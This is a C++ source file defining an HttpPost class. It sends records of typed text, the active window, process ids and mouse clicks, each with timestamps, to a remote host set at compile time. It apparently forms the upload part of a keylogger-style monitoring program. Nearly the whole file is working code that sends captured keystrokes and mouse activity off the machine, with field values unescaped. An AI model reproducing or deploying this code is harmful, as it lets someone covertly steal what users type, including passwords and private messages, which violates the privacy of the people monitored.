#include "debug.hh"
#include "HttpPost.hh"

HttpPost::HttpPost()
{
  DEBUG_MSG("HttpPost created");
  curl_global_init(CURL_GLOBAL_ALL);
  _curl = curl_easy_init();
}

HttpPost::~HttpPost()
{
  DEBUG_MSG("HttpPost deleted");
  if (_curl)
    curl_easy_cleanup(_curl);
  curl_global_cleanup();
}

bool	HttpPost::postPaquet(PaquetKeys *paquet, const std::string &name)
{
  std::string	request = "";
  std::string	url = HOST_NAME;

  url += PAQUET_KEYS;
  if (!_curl || !paquet)
    return false;

#ifdef DEBUG
  std::cerr << url.c_str() << std::endl;
#endif /* !DEBUG */

  request = createRequest(paquet, name);
  curl_easy_setopt(_curl, CURLOPT_URL, url.c_str());
  curl_easy_setopt(_curl, CURLOPT_POSTFIELDS, request.c_str());
  _res = curl_easy_perform(_curl);
  if (_res != CURLE_OK)
    {
      std::cerr << curl_easy_strerror(_res) << std::endl;
      return false;
    }
  return true;
}

bool	HttpPost::postPaquet(PaquetMouse *paquet, const std::string &name)
{
  std::string	request = "";
  std::string	url = HOST_NAME;

  url += PAQUET_MOUSE;
  if (!_curl || !paquet)
    return false;

#ifdef DEBUG
  std::cerr << url.c_str() << std::endl;
#endif /* !DEBUG */

  request = createRequest(paquet, name);
  curl_easy_setopt(_curl, CURLOPT_URL, url.c_str());
  curl_easy_setopt(_curl, CURLOPT_POSTFIELDS, request.c_str());
  _res = curl_easy_perform(_curl);
  if (_res != CURLE_OK)
    {
      std::cerr << curl_easy_strerror(_res) << std::endl;
      return false;
    }
  return true;
}

std::string	HttpPost::createRequest(PaquetKeys *paquet, const std::string &name)
{
  std::string	request = "";

  request = "paquet_key[name]=";
  request += name;
  request += "&paquet_key[date]=";
  request += std::to_string(paquet->getDate());
  request += "&paquet_key[active]=";
  request += (paquet->getActive()) ? (paquet->getActive()) : ("");
  request += "&paquet_key[text]=";
  request += (paquet->getText()) ? (paquet->getText()) : ("");
  request += "&paquet_key[pid]=";
  request += std::to_string(paquet->getPid());

#ifdef DEBUG
  std::cerr << request << std::endl;
#endif /* !DEBUG */

  return request;
}

std::string	HttpPost::createRequest(PaquetMouse *paquet, const std::string &name)
{
  std::string	request = "";

  request = "paquet_mouse[name]=";
  request += name;
  request += "&paquet_mouse[date]=";
  request += std::to_string(paquet->getDate());
  request += "&paquet_mouse[active]=";
  request += (paquet->getActive()) ? (paquet->getActive()) : ("");
  request += "&paquet_mouse[x]=";
  request += std::to_string(paquet->getX());
  request += "&paquet_mouse[y]=";
  request += std::to_string(paquet->getY());
  request += "&paquet_mouse[button]=";
  request += ((paquet->getButton() == 1) ? ("Left") : ((paquet->getButton() == 2) ? ("Middle") : ("Right")));
  request += "&paquet_mouse[pid]=";
  request += std::to_string(paquet->getPid());

#ifdef DEBUG
  std::cerr << request << std::endl;
#endif /* !DEBUG */

  return request;
}
